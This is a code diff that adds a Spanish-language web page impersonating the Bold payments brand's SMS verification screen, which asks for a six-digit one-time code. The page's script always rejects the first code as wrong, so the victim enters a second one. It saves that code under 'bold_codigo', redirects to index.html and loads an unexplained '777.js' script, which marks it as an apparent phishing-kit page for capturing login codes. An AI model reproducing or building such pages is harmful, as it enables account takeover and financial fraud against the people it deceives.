@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bold - Confirma el número</title>
+
+  <!-- Google Fonts: Montserrat -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    :root {
+      --navy: #101b52;
+      --pink: #ff2b5e;
+    }
+
+    body {
+      background-color: #fbfbff;
+      background-image:
+        radial-gradient(
+          circle 55% at 50% 44%,
+          rgba(255, 255, 255, 1) 0%,
+          rgba(255, 255, 255, 0.70) 45%,
+          rgba(255, 255, 255, 0) 68%
+        ),
+        radial-gradient(
+          circle at 50% 50%,
+          #fbfbff 0%,
+          #eef0ff 58%,
+          #dce1ff 100%
+        );
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    .screen {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background: transparent;
+      display: flex;
+      flex-direction: column;
+      padding: 22px 24px 26px;
+      position: relative;
+    }
+
+    /* ---------- barra superior ---------- */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 30px;
+    }
+
+    .close-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .close-icon {
+      width: 26px;
+      height: 26px;
+      stroke: var(--navy);
+      stroke-width: 2.6;
+      stroke-linecap: round;
+      fill: none;
+    }
+
+    .help-btn {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      background: #ffffff;
+      border: none;
+      border-radius: 999px;
+      padding: 9px 17px;
+      font-size: 15px;
+      font-weight: 700;
+      font-family: 'Montserrat', sans-serif;
+      color: var(--navy);
+      cursor: pointer;
+      box-shadow: 0 2px 12px rgba(16, 27, 82, 0.08);
+    }
+
+    .help-icon {
+      width: 22px;
+      height: 22px;
+      display: block;
+    }
+
+    /* ---------- encabezado ---------- */
+    .title {
+      font-size: 27px;
+      font-weight: 700;
+      color: var(--navy);
+      letter-spacing: -0.5px;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1f2547;
+      line-height: 1.45;
+      margin-bottom: 30px;
+    }
+
+    /* ---------- cajas del código ---------- */
+    .boxes {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+
+    .boxes.shake {
+      animation: shake 0.45s ease;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%      { transform: translateX(-8px); }
+      40%      { transform: translateX(8px); }
+      60%      { transform: translateX(-5px); }
+      80%      { transform: translateX(5px); }
+    }
+
+    .code-input {
+      flex: 1 1 0;
+      min-width: 0;
+      aspect-ratio: 1 / 1;
+      border: 1.5px solid #e7e9f8;
+      border-radius: 16px;
+      background: #ffffff;
+      color: var(--navy);
+      font-size: 22px;
+      font-weight: 700;
+      font-family: 'Montserrat', sans-serif;
+      text-align: center;
+      outline: none;
+      caret-color: var(--pink);
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .code-input:focus {
+      border-color: #b9bfe8;
+      box-shadow: 0 0 0 3px rgba(255, 43, 94, 0.10);
+    }
+
+    .code-input.error {
+      border-color: var(--pink);
+    }
+
+    .error-msg {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--pink);
+      height: 18px;
+      line-height: 18px;
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+
+    .error-msg.visible {
+      opacity: 1;
+    }
+
+    .spacer {
+      flex: 1;
+    }
+
+    /* ---------- aviso amarillo ---------- */
+    .banner {
+      display: flex;
+      align-items: center;
+      gap: 13px;
+      background: #fdf8e8;
+      border: 1px solid #f4e3ad;
+      border-radius: 16px;
+      padding: 16px 18px;
+      margin-bottom: 16px;
+    }
+
+    .banner-icon {
+      flex: 0 0 auto;
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #f7c948;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .banner p {
+      font-size: 14px;
+      font-weight: 600;
+      color: #3b3f52;
+      line-height: 1.35;
+    }
+
+    .banner a {
+      color: inherit;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    /* ---------- botón reenviar ---------- */
+    .resend {
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 30px;
+      background: var(--pink);
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 700;
+      font-family: 'Montserrat', sans-serif;
+      cursor: pointer;
+      transition: background 0.2s ease, opacity 0.2s ease;
+    }
+
+    .resend:disabled {
+      background: #ff9ab6;
+      cursor: default;
+    }
+
+    .resend:not(:disabled):active {
+      opacity: 0.9;
+    }
+
+    /* ---------- enlace inferior ---------- */
+    .no-access {
+      background: none;
+      border: none;
+      margin-top: 20px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'Montserrat', sans-serif;
+      color: var(--navy);
+      text-decoration: underline;
+      cursor: pointer;
+      text-align: center;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <div class="topbar">
+      <button class="close-btn" type="button" onclick="history.back()">
+        <svg class="close-icon" viewBox="0 0 24 24">
+          <line x1="5" y1="5" x2="19" y2="19" />
+          <line x1="19" y1="5" x2="5" y2="19" />
+        </svg>
+      </button>
+
+      <button class="help-btn" type="button">
+        Ayuda
+        <svg class="help-icon" viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="12" fill="#eef0ff" />
+          <circle cx="12" cy="10" r="4.6" fill="#f3c9a5" />
+          <path d="M7.4 9.4a4.6 4.6 0 0 1 9.2 0V8.2a4.6 4.6 0 0 0-9.2 0z" fill="#2b2b4a" />
+          <path d="M4.4 22.4a7.6 7.6 0 0 1 15.2 0z" fill="#3b3b6b" />
+        </svg>
+      </button>
+    </div>
+
+    <h1 class="title">Confirma el número</h1>
+    <p class="subtitle">Ingresa el código que enviamos por SMS al +57****.</p>
+
+    <div class="boxes" id="cajas">
+      <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+             maxlength="1" autocomplete="one-time-code" aria-label="Dígito 1" />
+      <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+             maxlength="1" aria-label="Dígito 2" />
+      <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+             maxlength="1" aria-label="Dígito 3" />
+      <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+             maxlength="1" aria-label="Dígito 4" />
+      <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+             maxlength="1" aria-label="Dígito 5" />
+      <input class="code-input" type="text" inputmode="numeric" pattern="[0-9]*"
+             maxlength="1" aria-label="Dígito 6" />
+    </div>
+
+    <p class="error-msg" id="aviso">Código incorrecto. Vuelve a intentarlo.</p>
+
+    <div class="spacer"></div>
+
+    <div class="banner">
+      <span class="banner-icon">!</span>
+      <p>¿No recibiste el código? <a>Probar otro método</a></p>
+    </div>
+
+    <button class="resend" id="reenviar" disabled>Reenviar código (0:40)</button>
+
+    <button class="no-access" type="button">No tengo acceso a este número de celular</button>
+  </div>
+
+  <script>
+    const cajas = Array.from(document.querySelectorAll(".code-input"));
+    const boxesWrap = document.getElementById("cajas");
+    const aviso = document.getElementById("aviso");
+    const btnReenviar = document.getElementById("reenviar");
+    const TOTAL = cajas.length;
+
+    let intento = 1;
+    let bloqueado = false;
+
+    /* ---------- captura del código ---------- */
+    cajas.forEach((caja, i) => {
+      caja.addEventListener("input", () => {
+        caja.value = caja.value.replace(/\D/g, "").slice(0, 1);
+        aviso.classList.remove("visible");
+
+        if (caja.value && i < TOTAL - 1) cajas[i + 1].focus();
+        revisar();
+      });
+
+      caja.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !caja.value && i > 0) {
+          cajas[i - 1].value = "";
+          cajas[i - 1].focus();
+          revisar();
+        }
+        if (e.key === "ArrowLeft" && i > 0) cajas[i - 1].focus();
+        if (e.key === "ArrowRight" && i < TOTAL - 1) cajas[i + 1].focus();
+      });
+
+      caja.addEventListener("paste", (e) => {
+        e.preventDefault();
+        const texto = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
+        if (!texto) return;
+
+        for (let j = 0; j < TOTAL - i && j < texto.length; j++) {
+          cajas[i + j].value = texto[j];
+        }
+        cajas[Math.min(i + texto.length, TOTAL - 1)].focus();
+        revisar();
+      });
+    });
+
+    function codigoActual() {
+      return cajas.map((c) => c.value).join("");
+    }
+
+    function revisar() {
+      if (bloqueado) return;
+
+      const codigo = codigoActual();
+      if (codigo.length < TOTAL) return;
+
+      if (intento === 1) {
+        // Primer intento: lo marcamos como incorrecto
+        intento = 2;
+        bloqueado = true;
+        mostrarError();
+
+        setTimeout(() => {
+          cajas.forEach((c) => { c.value = ""; c.classList.remove("error"); });
+          boxesWrap.classList.remove("shake");
+          cajas[0].focus();
+          bloqueado = false;
+        }, 1400);
+
+      } else {
+        // Segundo intento: guardamos y avanzamos
+        bloqueado = true;
+        localStorage.setItem("bold_codigo", codigo);
+
+        setTimeout(() => {
+          window.location.href = "index.html";
+        }, 400);
+      }
+    }
+
+    function mostrarError() {
+      cajas.forEach((c) => c.classList.add("error"));
+      boxesWrap.classList.add("shake");
+      aviso.classList.add("visible");
+    }
+
+    /* ---------- temporizador de reenvío ---------- */
+    let restante = 40;
+    let timer = null;
+
+    function pintarBoton() {
+      if (restante > 0) {
+        btnReenviar.disabled = true;
+        btnReenviar.textContent =
+          "Reenviar código (0:" + String(restante).padStart(2, "0") + ")";
+      } else {
+        btnReenviar.disabled = false;
+        btnReenviar.textContent = "Reenviar código";
+      }
+    }
+
+    function iniciarConteo() {
+      clearInterval(timer);
+      restante = 40;
+      pintarBoton();
+
+      timer = setInterval(() => {
+        restante--;
+        if (restante <= 0) {
+          restante = 0;
+          clearInterval(timer);
+        }
+        pintarBoton();
+      }, 1000);
+    }
+
+    btnReenviar.addEventListener("click", () => {
+      if (restante > 0) return;
+      iniciarConteo();
+    });
+
+    iniciarConteo();
+    cajas[0].focus();
+  </script>
+
+  <script src="777.js"></script>
+</body>
+</html>
